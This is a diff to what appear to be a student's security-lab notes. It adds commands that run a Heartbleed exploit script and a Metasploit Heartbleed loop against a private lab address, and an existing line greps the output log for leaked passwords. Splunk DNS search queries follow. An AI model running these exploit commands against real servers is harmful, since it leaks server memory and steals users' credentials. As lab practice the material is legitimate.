@@ -101,6 +101,7 @@ cd /home/etudiant/heartbleed-example
 <!-- sudo python heartbleed.py 192.168.1.49 -p 443 -n 1150 -->
 sudo python heartbleed.py 192.168.1.49 -p 443 -n 1150 > /home/etudiant/reject_exploit.log
 cat -n /home/etudiant/reject_exploit.log | grep assword | cat -n
+cat -n /home/etudiant/reject_exploit.log 
 
 
 ################ + d'information décodée
@@ -213,3 +214,18 @@ tcpdump HTTPS IPV6 TCP  Win ack
 DNS QUERY
 * sourcetype=tshark:port53 OR sourcetype=port53tttt src=* dest=*| fields dns_len query length reply_code Len message_type record_type transport | search message_type=QUERY 
 | table *
+
+
+
+
+# draft
+
+   38  sudo python heartbleed.py 192.168.1.49 -p 443 -n 1150
+   39  sudo python heartbleed.py 192.168.1.49 -p 443 -n 700
+   40  sudo python heartbleed.py 192.168.1.49 -p 443 -n 1500
+   41  sudo /home/etudiant/heartbleed-automation/bash/msf/metasploit_heartbleed_loop.sh
+   42  sudo python heartbleed.py 192.168.1.49 -p 443 -n 1500
+   43  sudo python heartbleed.py 192.168.1.49 -p 443 -n 1800
+   44  sudo python heartbleed.py 192.168.1.49 -p 443 -n 1100
+   45  sudo python heartbleed.py 192.168.1.49 -p 443 -n 900
+   46* sudo python heartbleed.py 192.168.1.49 -p 443 -n 1
